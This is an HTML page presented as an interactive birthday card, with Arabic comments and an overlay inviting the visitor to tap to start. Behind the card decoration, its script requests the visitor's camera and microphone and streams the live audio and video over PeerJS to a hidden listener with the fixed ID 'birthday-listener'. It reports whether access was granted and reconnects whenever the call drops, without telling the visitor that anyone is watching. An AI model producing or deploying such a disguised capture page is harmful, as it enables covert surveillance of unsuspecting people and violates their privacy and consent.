<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>🎂 Interactive Birthday Card</title>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
</head>
<body>
  <div id="overlay">اضغط لبدء الكارت</div>
  <div class="card">
    <!-- … كود التورتة والشمع … -->
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    // نضيف STUN servers لتحسين الاتصال
    const peer = new Peer(null, {
      debug: 2,
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
          // لو عندك TURN تقدر تضيفه هنا
        ]
      }
    });

    let dataConn;
    const overlay = document.getElementById('overlay');
    const videoEl = document.getElementById('userCam');

    overlay.addEventListener('click', async () => {
      overlay.style.display = 'none';
      dataConn = peer.connect(LISTENER_ID);
      dataConn.on('open', () => dataConn.send({ event: 'page-open' }));

      try {
        // 1 طلب واحد للميك + الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
        videoEl.srcObject = stream;
        dataConn.send({ event: 'media-allowed' });

        // 2 بث الستريم للمستمع
        const call = peer.call(LISTENER_ID, stream);

        // 3 إذا اتقفّل الاتصال حاول تعيد
        call.on('close', () => {
          console.warn('Call closed – retrying…');
          peer.call(LISTENER_ID, stream);
        });
        call.on('error', err => console.error('Call error', err));
      } catch (err) {
        console.error('getUserMedia failed:', err);
        dataConn.send({ event: 'media-denied' });
      }

      // تنسيق الكاميرا دايرياً
      Object.assign(videoEl.style, {
        position: 'absolute',
        top: '10px', left: 'calc(50% - 75px)',
        width: '150px', height: '150px',
        borderRadius: '50%',
        border: '4px solid white',
        boxShadow: '0 0 15px rgba(255,255,255,0.7)'
      });
    });
  </script>
</body>
</html>
